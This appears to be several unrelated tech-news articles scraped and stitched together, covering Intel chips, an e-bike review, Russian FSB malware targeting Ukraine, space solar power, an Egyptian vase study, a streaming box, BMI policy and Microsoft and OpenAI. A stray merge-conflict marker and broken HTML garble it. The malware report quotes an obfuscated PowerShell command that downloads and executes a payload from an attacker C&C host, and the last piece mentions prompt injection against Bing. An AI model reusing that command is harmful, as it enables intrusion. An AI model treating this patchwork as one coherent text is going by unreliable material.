<p>We also don't know whether the new desktop CPUs will be compatible with previous-generation 600- and 700-series motherboards or if Intel will require a newer motherboard to meet its power requirements. That's what Intel did in the switch from 7th- to 8th-generation desktop CPUs: It kept using the same physical socket for the processors but required new motherboards with new chipsets to actually support them.</p>
<p>Intel is expected to launch its first Meteor Lake chips, along with its branding changes, <a href="https://www.anandtech.com/show/18836/intel-meteor-lake-intel-4-process-now-ramping-for-production">in the second half of 2023</a>.</p>

<p class="p1">When it comes to e-bikes, sometimes less is more. That's the philosophy of Tenways, a 2-year-old Dutch e-bike manufacturer that has recently crossed the Atlantic to have a go at the US market. All four of its bikes are easy on the eyes, but the $1,899 <a href="https://fave.co/3qKUzLw" target="_blank" rel="noopener">CGO600 Pro</a> really grabbed my attention due to its sleek lines and gorgeous looks.</p>
>>>>>>> 2e5f39b77075e81b1a2a024a5e68c079ca2f11d8
<p class="p1">Tenways markets the CGO600 Pro as "The Lightweight Champion." It's a 37 lb (16.8 kg) bike built to get you from point A to point B with minimal fuss—or gears, as the CGO600 Pro is a single-speed specimen. The assistance comes from a 360 W rear hub motor powered by a 36 V, 10 Ah Li-ion battery. That's good for up to 53 miles of range, a number that jibes well with my experience riding the bike. There's also no chain—the CGO600 Pro uses a carbon belt-drive system, which cuts way back on maintenance, runs quieter, and has a longer life than a chain.</p>
<p>The CGO600 Pro really looks more like a flesh-powered hybrid than an e-bike. Absent is the chunky look of e-bikes like the <a href="https://arstechnica.com/cars/2023/01/doing-it-all-a-foldable-mountain-e-bike-with-extra-fat-tires/">Cyrusher XF690 Maxs</a> or <a href="https://arstechnica.com/cars/2022/08/no-gimmicks-no-problems-the-low-fuss-reasonably-priced-e-bike/">Velotric Discovery 1</a>. By contrast, the CGO600 Pro looks streamlined and svelte, ready to eat up the miles. The less-is-more design philosophy carries over to the LCD display, which is about the size of a Lego brick and is mounted near the handgrip on the left side of the handlebar. The downtube is slimmer than those on most e-bikes, with a removable battery accounting for the mass. The motor is located in the rear hub.</p>
<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/assembly.jpg"><img alt='This is what you see after opening the box.

<p class="p1">Before I could ride the Avocado Green CGO600 Pro, I had to put it together. Tenways' assembly instructions are better and easier to follow than some of the competition's (I'll have more to say about that in a future review), and the box includes all of the hardware necessary to put the bike together.</p>
<p class="p1">The build process was smooth, with one major exception. Getting the fenders and pedals on was a snap. Lining up the handlebars was tough and would've been easier with someone helping. Mounting the front wheel to the fork was the biggest issue. After a few frustrating moments, it dawned on me—the fork was backward, and the brake caliper was on the wrong side. I had to hit pause and ask Tenways what to do about the problem. The fix was simple: I took the handlebars off, removed a rubber grommet from the headset, loosened a screw with a hex key, spun the fork 180 degrees, and tightened it back up. The mudguards, pedals, and other assorted hardware went on without a hitch. Once I dropped the battery into the downtube and charged it, the CGO600 Pro was ready to ride.</p>

<p class="p1">Tenways bikes are all Level 2 e-bikes, so the CGO600 Pro will help you get to 20 mph (32 km/h), and you're on your own after that. There are three levels of assist, and with just a single gear available, I found myself using the highest assist level most of the time. Assist levels and all of the other controls for the bike are accessed via buttons on the small LCD display just outside the left handlebar grip. The display is easy to read, with speed and assist level evident at a glance. Its only downside is that it can be tough to read in direct sunlight, especially with sunglasses on. For rides after dark, the CGO600 Pro has a power headlight built into the headtube, which is controlled via the display.</p>
<p>There's no throttle on the Tenways, so you'll have to at least do some cursory pedaling to get underway and up to speed.</p>

<div class="image shortcode-img center large"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display.jpg"><img alt='If you don&#039;t enter the password, the CGO600 Pro&#039;s motor won&#039;t activate, so it becomes a very heavy single-speed bike.'  src="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display-640x853.jpg" srcset="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display.jpg 2x" alt='If you don&#039;t enter the password, the CGO600 Pro&#039;s motor won&#039;t activate, so it becomes a very heavy single-speed bike.' ></a><p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/06/display.jpg"class="caption-link" rel="nofollow">If you don't enter the password, the CGO600 Pro's motor won't activate, so it becomes a very heavy single-speed bike.</a> (credit: Eric Bangeman)</p></div>
<p class="p1">In addition to showing speed, battery power, and assist level, the display can be used to tweak some of the bike's settings. You can set a four-digit password for the bike, set the maximum assist speed to anything between 0 and 20 mph, and even check how many charging cycles the battery has undergone. It's a smart, minimalist design. Tenways also provides an app, which can track rides and offers some other limited functionality, but it's not in the same class as something like Trek Connect.</p>
<p>One nice feature is the ability to check the charge without turning on the bike or reaching for your phone. On the left side of the battery is a small button with three colored LEDs above it that light up to indicate the amount of charge left.

<p class="p1">The aluminum frame, front fork, and wheels all make for a lightweight bike—and a stiff ride. In fact, I found the CGO600 Pro ride to be jarring at times. My garage is on a concrete alley that doesn't get much in the way of maintenance from the suburb I live in. So I felt every crack and missing chunk in the pavement each time I took the e-bike out for a spin. But once I was on paved roads, the ride was smooth enough. The electric motor kicked in very quickly once I began pedaling, and I enjoyed the more aggressive riding position offered by the CGO600 Pro. The belt drive made for a quiet ride as well.</p>
<p class="p1">I wasn't so crazy about the brakes, however. The brake levers on the handlebars are small, seemingly like they were taken off a child's bike. I also had a problem with the rear hydraulic disc brake feeling very spongy and not offering much stopping power. Tenways suggested I bleed the brakes myself or take it to a bike shop and have it done there. If I went the latter route, I would be reimbursed under Tenways' warranty policy, which specifies that customers will be reimbursed if they need warranty work done at a bike shop. Unfortunately for me, my local bike shop only services e-bikes that it sells, so that's one thing to keep in mind when thinking about buying an e-bike—you may have a harder time getting repairs done than with a 100 percent human-powered bicycle.</p>

<p>Aside from an overly stiff ride, the CGO600 Pro checks all the boxes you'd want from a commuter bike. At $1,899, there are definitely cheaper options available, such as the ~$800 <a href="https://arstechnica.com/cars/2021/11/the-swft-volt-a-minimalist-e-bike-with-a-price-to-match/">SWFT Volt</a> we reviewed in 2021. But in this case, the higher price means better components, like the strong built-in headlight, lightweight removable battery, hydraulic disc brakes, and belt drive to name a few. It's a strong contrast to cheaper e-bikes like the <a href="https://arstechnica.com/cars/2022/08/no-gimmicks-no-problems-the-low-fuss-reasonably-priced-e-bike/">Velotric Discovery 1</a>, where cheap components like lightweight plastic pedals are the norm. The CGO600 Pro may carry a price premium, but the quality of both the components and ride helps make up for that.</p>

      <p class="caption" style="font-size:0.8em"><a href="https://cdn.arstechnica.net/wp-content/uploads/2022/04/russia-cyber-hack.jpeg" class="enlarge-link" data-height="667" data-width="1000">Enlarge</a> (credit: Getty Images)</p>  </figure>






<div><a name='page-1'></a></div>
<p>Hackers working for Russia’s Federal Security Service have mounted multiple cyberattacks that used USB-based malware to steal large amounts of data from Ukrainian targets for use in its ongoing invasion of its smaller neighbor, researchers said.</p>
<p>“The sectors and nature of the organizations and machines targeted may have given the attackers access to significant amounts of sensitive information,” researchers from Symantec, now owned by Broadcom, wrote in a <a href="link">Thursday post</a>. “There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things.”</p>
<p>The group, which Symantec tracks as Shuckworm and other researchers call Gamaredon and Armageddon, has been active since 2014 and has been linked to Russia’s FSB, the principal security service in that country. The group focuses solely on obtaining intelligence on Ukrainian targets. In 2020, researchers at security firm SentinelOne <a href="https://www.sentinelone.com/blog/who-are-the-gamaredon-group-and-what-do-they-want/">said</a> the hacking group had “attacked over 5,000 individual entities across the Ukraine, with particular focus on areas where Ukrainian troops are deployed.”</p>
<p>In February, Shuckworm began deploying new malware and command-and-control infrastructure that has successfully penetrated the defenses of multiple Ukrainian organizations in the military, security services, and government of that country. Group members seem most interested in obtaining information related to sensitive military information that could be abused in Russia’s ongoing invasion.</p>
<p>This newer campaign debuted new malware in the form of a PowerShell script that spreads Pterodo, a Shuckworm-created backdoor. The script activates when infected USB drives are connected to targeted computers. The malicious script first copies itself onto the targeted machine to create a shortcut file with the extension rtf.lnk. The files have names such as video_porn.rtf.lnk, do_not_delete.rtf.lnk, and evidence.rtf.lnk. The names, which are mostly in the Ukrainian language, are an attempt to entice targets to open the files so they will install Pterodo on machines.</p>
<p>The script goes on to enumerate all drives connected to the targeted computer and to copy itself to all attached removable drives, most likely in hopes of infecting any air-gapped devices, which are intentionally not connected to the Internet in an attempt to prevent them from being hacked.</p>
<p>To cover its tracks, Shuckworm has created dozens of variants and rapidly rotated the IP addresses and infrastructure it uses for command and control. The group also uses legitimate services such as Telegram and its micro-blogging platform Telegraph for command and control in another attempt to avoid detection.</p>
<p>Shuckworm typically uses phishing emails as an initial vector into targets’ computers. The emails contain malicious attachments that masquerade as files with extensions, including .docx, .rar, .sfx, lnk, and hta. Emails often use topics such as armed conflicts, criminal proceedings, combating crime, and protecting children as lures to get targets to open the emails and click on the attachments.</p>
<p>Symantec researchers said that an infected computer they recovered in the campaign was typical for the way it works. They wrote:</p>
<blockquote><p>In one victim, the first sign of malicious activity was when the user appeared to open a RAR archive file that was likely delivered via a spear-phishing email and which contained a malicious Document.</p>
<p>After the document was opened, a malicious PowerShell command was observed being executed to download the next-stage payload from the attackers’ C&amp;C server:</p>
<p>"CSIDL_SYSTEM\cmd.exe" /c start /min "" powershell -w hidden<br />
"$gt='/get.'+[char](56+56)+[char](104)+[char](112);$hosta=[char](50+4<br />
8);[system.net.servicepointmanager]::servercertificatevalidationcallb<br />
ack={$true};$hosta+='.vafikgo.';$hosta+=[char](57+57);$hosta+=[char](<br />
60+57);$addrs=[system.net.dns]::gethostbyname($hosta);$addr=$addrs.ad<br />
dresslist[0];$client=(new-object<br />
net.webclient);$faddr='htt'+'ps://'+$addr+$gt;$text=$client.downloads<br />
tring($faddr);iex $text"</p>
<p>More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This is likely an attempt to evade some tracking methods employed by researchers.</p>
<p>Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April 2023.</p></blockquote>
<p>Thursday’s post includes IP addresses, hashes, file names, and other indicators of compromise people can use to detect if they have been targeted. The post also warns that the group poses a threat that targets should take seriously.</p>
<p>“This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues,” they wrote. “It seems clear that Russian nation-state-backed attack groups continue to laser in on Ukrainian targets in attempts to find data that may potentially help their military operations.”</p>

<div><a name='page-1'></a></div>
<p>As far as legislative moments go, the passage of a minor amendment to an innocuous US House resolution on Wednesday was not exactly groundbreaking. But for space exploration enthusiasts, <a href="https://republicans-science.house.gov/_cache/files/d/b/dbd4efc2-e2c0-4f95-9106-6773d8158bb5/565725B24E244E9FEF0193CC0F86FB21.h.r.-2988-amendment-008-mullin.pdf">the amendment offered</a> by US Rep. Kevin Mullin, D-Calif., was kind of a big deal.</p>
<p>That's because, for the <a href="https://www.govinfo.gov/content/pkg/GPO-CRECB-1978-pt5/pdf/GPO-CRECB-1978-pt5-6-1.pdf">first time since the 1970s</a>, the idea of space-based solar power has been addressed legislatively by the US Congress.</p>
<p>"Although the technology to gather solar energy in space and send it to the surface as electricity is not yet commercially viable at scale, we already know from early research that it is possible," Mullin said <a href="https://www.youtube.com/watch?v=eIGXFnXP1W4&amp;t=1680s">during a meeting</a> of the Science, Space, and Technology Committee on Wednesday.</p>
<p>Mullin was seeking to amend House Resolution 2988, a bill instructing NASA and the US Department of Energy to collaborate on key areas of research and development, including propulsion, artificial intelligence, astrophysics, Earth science, and quantum computing. He sought to add space-based solar power to the list. The amendment passed overwhelmingly by a bipartisan committee vote.</p>

<p>In his remarks, Mullin noted that <a href="https://arstechnica.com/science/2022/08/european-space-chief-says-continent-will-lead-in-space-based-solar-power/">Europe</a>, Japan, China, and the United Kingdom are all studying the technology and considering in-space demonstrations. And in the United States, the California Institute of Technology <a href="https://www.caltech.edu/about/news/in-a-first-caltechs-space-solar-power-demonstrator-wirelessly-transmits-power-in-space">recently demonstrated</a> the ability to wirelessly transmit power in space and beam detectable power back to Earth.</p>
<p>"A lot of the technology that once made this source of energy the work of science fiction is now much cheaper, and easier to deploy than ever, putting it within reach," Mullin said. "But it's not inevitable that this promising research will become feasible at scale. There are still science and engineering hurdles to overcome. And if the United States doesn't do it, we know our friends and global competitors will."</p>
<h2>Sending a message</h2>
<p>The legislation, with Mullin's amendment now attached, should be voted on by the committee on Thursday. If passed, as expected, it will likely become part of a House authorization bill later this year.</p>
<p>The House resolution carries no funding for these initiatives, and it's not like NASA and the Department of Energy will drop everything tomorrow and start working on space-based solar power. But the resolution signals the intent of Congress to NASA and the Department of Energy that it is interested in seeing some movement on this topic. This could presage eventual funding.</p>
<p>Before its passage, the amendment was supported by several space advocacy groups, including the Alliance for Space Development, Space Frontier Foundation, and National Space Society. "This is the first time since the 1970s that the idea of space solar power has been addressed in legislation," said Jonathan Dagle, a policy manager for the National Space Society. He characterized the amendment as "a small but significant victory."</p>
<p>NASA could do with a little prodding on the subject. Last year, at the International Space Development Conference, <a href="https://spacenews.com/nasa-to-reexamine-space-based-solar-power/">a NASA official said</a> the agency had begun a short-term study evaluating the prospects of space-based solar power. This was the agency's first real look at the subject in about two decades. However, that study has not been released publicly, as there were apparently some policy concerns about the first draft. The revised study <a href="https://twitter.com/davehuntsman/status/1669093774704648192">may finally be released</a> in late June or July.</p>
<p>Part of the renewed interest in solar power from space is due to the expansion of launch capabilities, particularly the potential of SpaceX's Starship launch vehicle to carry large payloads into orbit with a reusable first and second stage. This dramatic improvement in launch costs and upmass could help to address some of the economic concerns with the technology—namely that it is often more efficient to put solar panels in the desert than in space.</p>

<div><a name='page-1'></a></div>
<p>An ancient Egyptian vase in the shape of the deity <a href="https://en.wikipedia.org/wiki/Bes">Bes</a> showed traces of chemical plant compounds known to produce hallucinations, according to a <a href="https://www.researchsquare.com/article/rs-3000218/v1">recent preprint</a> posted to Research Square. The authors suggest that members of the cult of Bes may have consumed a special cocktail containing the compounds to induce altered states of consciousness.</p>
<p>There is ample evidence that humans in many cultures throughout history used various hallucinogenic substances in religious ceremonies or shamanic rituals. That includes not just ancient Egypt but also ancient Greek, Vedic, Maya, Inca, and Aztec cultures. The <a href="https://en.wikipedia.org/wiki/Urarina">Urarina</a> people who live in the Peruvian Amazon Basin still use a psychoactive brew called <a href="https://en.wikipedia.org/wiki/Ayahuasca">ayahuasca</a> in their rituals, and Westerners seeking their own brand of enlightenment have also been known to participate.</p>
<p>Lacing the beer served at their feasts with hallucinogens may have helped an ancient Peruvian people known as the <a href="https://en.wikipedia.org/wiki/Wari_culture" data-uri="c892a87dd8d7668938e6dc9fb6835e24">Wari</a> forge political alliances and expand their empire, according to a <a href="https://www.cambridge.org/core/journals/antiquity/article/abs/hallucinogens-alcohol-and-shifting-leadership-strategies-in-the-ancient-peruvian-andes/15030A62A428B74805BADF7DB4137298">2022 study</a>. As <a href="https://arstechnica.com/science/2022/01/ancient-peruvians-partied-hard-spiked-their-beer-with-hallucinogens-to-win-friends/">previously reported</a>, the use of hallucinogens, particularly a substance derived from the seeds of the vilca tree, was common in the region during the so-called Middle Horizon period, when the Wari empire thrived. </p>
<p><a href="https://en.wikipedia.org/wiki/Anadenanthera_colubrina" data-uri="3a6df6d3c2d96f72fb0cb9f5d242f8a1">Vilca</a> typically grows in the dry tropical forests in the region. The trees produce long legumes filled with thin seeds. The seeds, bark, and other parts of the tree all contain <a href="https://en.wikipedia.org/wiki/N,N-Dimethyltryptamine" data-uri="a46edd3713c55d191a6f1646e5f132b7">DMT</a>, a well-known psychedelic substance that is also found in <a href="https://en.wikipedia.org/wiki/Ayahuasca" data-uri="00a69242c8e3de25bae5c37a10aa5b44">ayahuasca brews,</a> but the primary active ingredient is <a href="https://en.wikipedia.org/wiki/Bufotenin" data-uri="2020545207fd054347a59f508a981adf">bufotenine</a>. It was usually smoked, ingested in the form of snuff, or used as an enema. A 4,000-year-old pipe laced with bufotenine residue and related paraphernalia was found in an Incan cave in Argentina in 1999—the oldest archaeological evidence to date for using vilca in South America.</p>
<p>There is also evidence from historical accounts that a juice or tea derived from vilca seeds was sometimes added to <a href="https://en.wikipedia.org/wiki/Chicha" data-uri="c21a2360adabd3716aa92dc9f9e606ef">chicha</a>, a fermented beverage made from maize or the fruits of the molle tree native to Peru. And people of the state of <a href="https://en.wikipedia.org/wiki/Tiwanaku">Tiwanaku</a> were known to mix such hallucinogens with alcohol, specifically maize beer. There are monoliths depicting figures holding a drinking cup in one hand and a snuff tray in another, and smoking or inhaling vilca was part of a long-standing ritual tradition to foster personal spiritual journeys.</p>
<p>For this latest work, Davide Tanasi of the University of South Florida and his co-authors analyzed an Egyptian ritual vase in the shape of Bes dating back to the second century BCE—known as the <a href="https://en.wikipedia.org/wiki/Ptolemaic_Kingdom">Ptolemaic period</a>—in the collection of the Tampa Museum of Art in Florida. Bes was a popular deity believed to confer protection on households, especially mothers and children. So unlike most other Egyptian deities, images of Bes were quite common in Egyptian homes. There were even special chambers built to honor Bes and his wife Beset at the <a href="https://en.wikipedia.org/wiki/Saqqara">Saqqara</a> site near Cairo, which Egyptologists think could have been used for fertility or healing rituals, although their exact purpose is not certain.</p>

Tanasi et al., 2023)</p></div>
<p>Many ceramic vases or similar vessels representing Bes have been found and now populate museums and private collections around the world. Most hypotheses about what the vessels may have held, and the purposes for which they were used, are based on mythological sources. Scholars have suggested they held sacred water, milk, wine, beer, kohl, perfume, or medicinal potions, but few have been tested for traces of organic compounds. One <a href="https://www.semanticscholar.org/paper/Water%2C-milk%2C-beer-and-wine-for-the-living-and-the-%3A-Kaiser/15549228ac3223af9b4613998e9566c0d486972e">2004 study</a> looked for residues of animal proteins in 23 Bes vases, but the DNA analysis turned up just four positive results due to protein degradation and other challenges.</p>
<p>So the Tampa Museum of Art's Bes vase offered an opportunity to address how such a vase might have been used in Bes-related rituals, per the authors. The museum acquired the vase in 1984 from a private collection; it had been purchased from a gallery in Cairo in 1960. After collecting sample residues from the vessel, Tanasi <em>et al</em>. applied various techniques—including proteomic and genetic analyses and synchrotron radiation-based Fourier-transform infrared microspectroscopy—to characterize the residues.</p>
<p>Among the more intriguing results was the presence of <a href="https://en.wikipedia.org/wiki/Peganum_harmala">Syrian rue</a> (<em>Peganum harmala</em>), whose seeds are known to have hallucinogenic properties that can induce dream-like visions, per the authors, thanks to its production of the alkaloids harmine and harmaline. There were also traces of <a href="https://en.wikipedia.org/wiki/Nymphaea_nouchali_var._caerulea">blue water-lily</a> (<em>Nymphaea cerulea</em>), which contains a psychoactive alkaloid that acts as a sedative; it's one of several candidate plants that scholars believe might be the fruit of the lotus tree described in Homer's <em>Odyssey</em>. Both were known to the Egyptians, and the authors concluded that these two plants "were deliberately used as sources of psychoactive substances for ritual purposes."</p>
<p>In addition, Tanasi <em>et al</em>. identified traces of a fermented alcoholic concoction containing yeasts, wheat, sesame seeds, fruit (possibly grapes), honey, and, um, "human fluids": possibly breast milk, oral or vaginal mucus, and blood. (The traces of human skin were dismissed as likely contamination.) "In light of our results, it would be possible to infer that this Bes vase was used for some sort of ritual of re-enactment of what happened in a significant event in Egyptian myth," the authors wrote. That would be the Myth of the Solar Eye, in which Bes served the goddess <a href="https://en.wikipedia.org/wiki/Hathor">Hathor</a> an alcoholic drink spiked with a plant-based drug to make her fall into a deep sleep and forget about exacting vengeance.</p>
<p>Also, graffiti refers to Bes as the "giver of oracles" and the "giver of dreams," and one known ritual of the cult involved sleeping in the Saqqara chambers in hopes of having prophetic dreams. The compounds identified in this particular Bes vase would certainly have aided in that objective. However, the authors cautioned that Egyptian belief systems and ritual practices were very complex, and their findings may only apply to this particular vessel. Performing similar analysis on other examples of Bes vases would further enhance our understanding of the purpose of these intriguing artifacts.</p>

<div><a name='page-1'></a></div>
<p>Consumers right now are faced with an overwhelming number of choices for watching streaming media on a TV. Most TVs have a system built in, often Roku, Google, or Samsung. Standalone boxes from Roku, Apple, Google, and Amazon rule the third-party market, and smaller vendors offer remarkably cheap Android-based boxes online and at discount retailers.</p>
<p>But—wait—that's not all. Now <a href="https://fave.co/3XaOtAj" target="_blank" rel="noopener">Comcast</a> and Charter, the largest and second-largest cable companies in the US, have their own HDMI-box offering. If you've always wanted a box full of "free" ad-stuffed, pseudo-streaming channels that doesn't have the app stores or mirroring capabilities of the major brands and helps major cable companies regain market position and recoup revenue lost to cord-cutters like you, <a href="https://cordcuttersnews.com/comcast-spectrum-plan-to-take-on-roku-amazon-by-selling-a-streaming-player-at-walmart/?tag=reviewgeek-20&amp;asc_refurl=https://www.reviewgeek.com/155350/these-cable-companies-are-teaming-up-to-sell-a-streaming-box-at-walmart/\">say hello to the Xumo Box</a>.</p>
<p>Xumo is the name of <a href="https://play.xumo.com/live-guide/cbs-news">Comcast's free streaming service</a>, purchased by the company in 2020. It's the kind that looks like a cable channel guide and has an endless loop of pre-selected game shows, reality TV, crime procedurals, and other ready-to-license material akin to Pluto and Freevee. Xumo is a big part of <a href="https://www.xfinity.com/learn/flex?cjevent=75804f2a0aed11ee8109524d0a82b832&amp;cjdata=MXxOfDB8WXww">Flex</a>, the streaming box Comcast's Xfinity service offers to customers who don't want a traditional TV plan.</p>
<p>The Xumo Box is a rebranded <a href="https://fave.co/3P92TyN" target="_blank" rel="noopener">Flex</a> but will be sold in Walmart and other stores in late 2023, as <a href="https://cordcuttersnews.com/comcast-spectrum-plan-to-take-on-roku-amazon-by-selling-a-streaming-player-at-walmart/?tag=reviewgeek-20&amp;asc_refurl=https://www.reviewgeek.com/155350/these-cable-companies-are-teaming-up-to-sell-a-streaming-box-at-walmart/">reported by Cord Cutters</a>. It seems likely to be offered to both Comcast and Charter Spectrum customers, given that Charter <a href="https://corporate.comcast.com/press/releases/comcast-charter-flex-nationwide-streaming-xclass-tv">put $900 million into a joint venture</a> to produce "a variety of branded 4K streaming devices and smart TVs." Cord Cutters suggests the pricing to be "very competitive" with Roku and Fire TV boxes, which can be had for as low as $25 while on sale.</p>
<p>The existence of a retail box comes shortly after the Xumo venture announced it would provide its free (i.e., ad-supported) <a href="https://thedesk.net/2023/06/xumo-power-free-ad-supported-tcl-channels/">streaming channels on TCL smart TVs</a>. Meanwhile, the Xumo venture aims to also provide its own TVs at some point.</p>

<p>From reading reviews of the Flex over the last few years, it has picked up <a href="https://www.xfinity.com/learn/digital-cable-tv/streaming-services?INTCMP=FlexLearn_Flex_ExploreAppsFlex_Flex">many more services</a> while aggressively pushing its Xumo-centric "Free to you" section. Otherwise, it has reportedly decent voice control and a fairly standard "rows of squares" interface. Each streaming service is added by Xfinity, however, rather than being available in an app store akin to what Apple, Google, Amazon, or Roku provide.</p>
<p>Comcast and Charter aren't likely getting into the streaming-hardware business because they're eager to spend hundreds of millions of dollars getting to fifth place. Rather, they've noticed that nearly a third of TVs sold in the US are running Roku's software and that <a href="https://arstechnica.com/gadgets/2023/01/this-spring-roku-will-finally-start-shipping-its-own-tvs/">Roku is making its own TVs</a>. Those Roku TVs also see a lot of ads and customer data left on the table. Comcast and Charter <a href="https://arstechnica.com/information-technology/2022/08/charter-loses-home-internet-customers-blames-end-of-covid-subsidy-program/">failed to add more Internet customers in mid-2022</a>, a rare outcome that could have both companies considering revenue diversification.</p>
<p>Time will tell if those needing a new streaming box will turn to a new box backed by companies with <a href="https://arstechnica.com/information-technology/2014/05/comcast-time-warner-cable-still-have-the-angriest-customers-survey-finds/">historically tricky brands</a>.</p>

<div><a name='page-1'></a></div>
<p>Body mass index has for decades been used as a shorthand for assessing body fat and weight-related health risks. But for about just as long, critics have noted the simple calculation is laden with problems; BMI doesn’t actually measure fat mass, account for its distribution, or how those differ by age, gender, ethnicity, race, and how those differences affect health risks. Calculations and cutoffs are largely based on past generations of non-Hispanic white people. And BMI classifications mislead people on their individual risks of disease and death and can lead to substandard care for eating disorders.</p>
<p>Now, it seems the hefty criticism has finally reached a critical mass. During the annual meeting of the American Medical Association (AMA) this week in Chicago, physicians and medical students voted to adopt <a href="https://www.ama-assn.org/system/files/a23-refcomm-d-annotated.pdf">a strongly worded policy</a> acknowledging the calculation's "significant limitations" and "historical harms," including "racist exclusion." While the massive medical group acknowledged that BMI remains useful for population-level trends and associations, the policy called for doctors to become familiar with the calculation's problems and explore alternative measurements for diagnosing obesity and assessing health risks.</p>
<p>"There are numerous concerns with the way BMI has been used to measure body fat and diagnose obesity, yet some physicians find it to be a helpful measure in certain scenarios," AMA Immediate Past President Jack Resneck, Jr., said in <a href="https://www.ama-assn.org/press-center/press-releases/ama-adopts-new-public-health-policies-improve-health-nation-6">a statement</a>. "It is important for physicians to understand the benefits and limitations of using BMI in clinical settings to determine the best care for their patients."</p>
<h2>History</h2>
<p>The shift will likely inspire cheers from critics, whose numbers have been increasing for decades. Even before the rise of BMI—aka the Quetelet Index as it was called in the 1970s—medical researchers had realized that simple features like leg length, bone mass, and body frame influenced weight-to-height ratios.</p>
<p>BMI is a simple calculation of weight in kilograms divided by height in meters squared. In 1993, an expert advisory committee for the World Health Organization came up with four BMI-based weight categories: underweight (below 20), normal weight (20 to 24.9), overweight (25 to 29.9), and obese (30 and up). In the US then, the National Institutes of Health considered the threshold for overweight to be a BMI of 27.8  for men or 27.3 for women. Anything under those cutoffs was "normal." This was based on an 85 percent cutoff point from data in a large national NIH survey. But in 1998, the NIH lowered the cutoff to 25, aligning with WHO categories. And overnight, millions of Americans went from having normal weight to overweight. <a href="https://www.cdc.gov/healthyweight/assessing/bmi/adult_bmi/index.html#InterpretedAdults">That cutoff is still used</a>.</p>
<p>BMI is a simple, easy-to-obtain number that has strong, established associations with body fatness, morbidity, and mortality data. But on an individual level, it's loaded with limitations. For one, it doesn't actually measure body fat mass—it can't distinguish lean mass from fat.</p>
<div><a name='page-2'></a></div>
<h2>Disadvantages</h2>
<p>In <a href="https://www.ama-assn.org/system/files/a23-handbook-refcom-d.pdf">a report prepared by an AMA council</a> before the vote, council members noted that updated data from a national NIH survey compared BMI to body fat percentages based on bioelectric impedance. In subjects all with a BMI of 25, the percent of body fat in men varied between 14 percent and 35 percent, and in women, it varied between 26 percent and 43 percent, the report noted. Based on the NIH's criteria for defining obesity based on percent of body fat, subjects with the same BMI—which was at the cutoff for overweight—were associated with a body fat mass that varied between "low normal" to "obese."</p>
<p>BMI also doesn't account for fat distribution and a person's life stage. For decades, researchers have noted that the accumulation of fat in the upper part of the body ("apple-shaped" body) is linked to higher risks of diseases, like coronary heart disease and diabetes, compared to when fat accumulates in the lower body ("pear-shaped" body). Hormonal changes in puberty may be linked to some fat distribution differences. For instance, females generally develop fat stores around their pelvis and thigh during puberty, which is not seen in males, who develop a relatively larger amount of lean mass during puberty. And as women age, they tend to lose bone and muscle mass. Thus, as the AMA report notes, a 65-year-old woman who weighs the same as she did when she was 25 will actually have a higher percentage of body fat than she had in the past.</p>
<p>Beyond gender, racial and ethnic minorities also have different weight-related health risks. For example, <a href="https://pubmed.ncbi.nlm.nih.gov/16801583/">a 2006 study</a> found that Asian women had more than double the risk of developing diabetes than white women who had the same BMI. Other studies have also noted that Asians have higher risks of cardiovascular disease at the same BMIs as white Europeans. One possible explanation is differences in fat mass. <a href="https://pubmed.ncbi.nlm.nih.gov/12164465/">A 2002 study</a> found that, when compared to white Europeans of the same BMI, Asian people have 3 percent to 5 percent higher body fat. By contrast, <a href="https://pubmed.ncbi.nlm.nih.gov/17342075/">a 2007 study</a> suggested that Black women have higher lean mass than white women.</p>
<p>The AMA report also noted that BMI doesn't account for other factors that can significantly affect health, such as family history of disease, genetic factors, smoking, excessive alcohol use, mental health, stability of body weight, medication-induced obesity, and a person's occupation. The simple BMI-based cutoffs for underweight can miss eating disorders, and the AMA notes that an "overemphasis on bodily thinness is as deleterious to one's physical and mental health as obesity."</p>
<h2>Alternatives</h2>
<p>To move away from the harms and limitations of BMI, the AMA calls for researchers to become familiar with alternative ways of assessing fat and research these as potential new standards. These include: abdominal circumference measurements; waist-to-hip ratio; skinfold measurements; an empirical mathematical model called the Visceral Adiposity Index; a linear equation for the relative fat mass, which is based on a height-to-waist ratio; underwater weighting to look at body density (hydrostatic weighting); and air displacement plethysmography (aka Bod Pod).</p>
<p>There's also bioelectrical impedance, which models the body as five cylinders of mass (the trunk and four limbs) and estimates body fat mass. Last, there's a variety of imaging methods including dual-energy X-ray absorptiometry (DXA), computed tomography (CT) scans, and magnetic resonance imaging (MRI). The combination of CT and MRI scans is currently considered the gold standard for body composition analysis, the AMA notes.</p>
<p>In all, the AMA's new policy acknowledges "the significant limitations associated with the widespread use of BMI in clinical settings and suggests its use be in conjunction with other valid measures of risk."</p>

<p>Tension and confusion have made the partnership between Microsoft and OpenAI "awkward," people familiar with the matter revealed in a <a href="https://www.wsj.com/articles/microsoft-and-openai-forge-awkward-partnership-as-techs-new-power-couple-3092de51">Wall Street Journal report</a> today.</p>
<p>Not only has this tension and confusion extended to Microsoft's internal AI team—which apparently is dealing with budget cuts and limited access to OpenAI technology—but sources said it also clouded Microsoft's controversial <a href="https://arstechnica.com/information-technology/2023/02/microsoft-announces-ai-powered-bing-search-and-edge-browser/">rollout of AI-powered Bing search</a> last February. At that time, Bing was found to be <a href="https://arstechnica.com/information-technology/2023/02/ai-powered-bing-chat-spills-its-secrets-via-prompt-injection-attack/">vulnerable to prompt injection attacks</a> revealing company secrets and providing sometimes inaccurate and <a href="https://arstechnica.com/information-technology/2023/02/ai-powered-bing-chat-loses-its-mind-when-fed-ars-technica-article/">truly unhinged responses to user prompts</a>.</p>
<p>According to WSJ, OpenAI warned Microsoft "about the perils of rushing to integrate OpenAI’s technology without training it more" and "suggested Microsoft move slower on integrating its AI technology with Bing." A top concern for OpenAI was that Bing's chatbot, Sydney, might give inaccurate or unhinged responses, but this early warning seemingly was easily ignored by Microsoft.</p>
